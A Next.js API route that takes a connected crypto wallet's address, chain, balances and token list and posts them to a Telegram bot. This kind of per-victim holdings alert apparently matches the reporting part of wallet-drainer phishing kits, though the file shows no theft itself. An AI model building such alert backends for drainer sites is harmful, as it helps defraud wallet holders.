import { type NextRequest, NextResponse } from "next/server"
import { createTelegramBot } from "@/lib/telegram"

export async function POST(request: NextRequest) {
  try {
    console.log("📨 Received wallet connection notification request")

    const body = await request.json()
    console.log("📋 Request body:", body)

    const { address, chainName, chainId, nativeBalance, nativeSymbol, tokens } = body

    // Validate required fields
    if (!address || !chainName || !nativeBalance || !nativeSymbol) {
      console.error("❌ Missing required fields:", { address, chainName, nativeBalance, nativeSymbol })
      return NextResponse.json({ error: "Missing required fields" }, { status: 400 })
    }

    // Create Telegram bot instance
    const bot = createTelegramBot()
    if (!bot) {
      console.error("❌ Telegram bot not configured")
      return NextResponse.json({ error: "Telegram bot not configured" }, { status: 500 })
    }

    console.log("🤖 Sending Telegram notification...")

    // Send notification
    const success = await bot.sendWalletConnectionNotification({
      address,
      chainName,
      chainId,
      nativeBalance,
      nativeSymbol,
      tokens: tokens || [],
      timestamp:
        new Date().toLocaleString("en-US", {
          timeZone: "UTC",
          year: "numeric",
          month: "2-digit",
          day: "2-digit",
          hour: "2-digit",
          minute: "2-digit",
          second: "2-digit",
        }) + " UTC",
    })

    if (!success) {
      console.error("❌ Failed to send Telegram notification")
      return NextResponse.json({ error: "Failed to send Telegram notification" }, { status: 500 })
    }

    console.log("✅ Telegram notification sent successfully")
    return NextResponse.json({ success: true, message: "Notification sent successfully" })
  } catch (error) {
    console.error("❌ Telegram notification error:", error)
    return NextResponse.json({ error: "Internal server error" }, { status: 500 })
  }
}
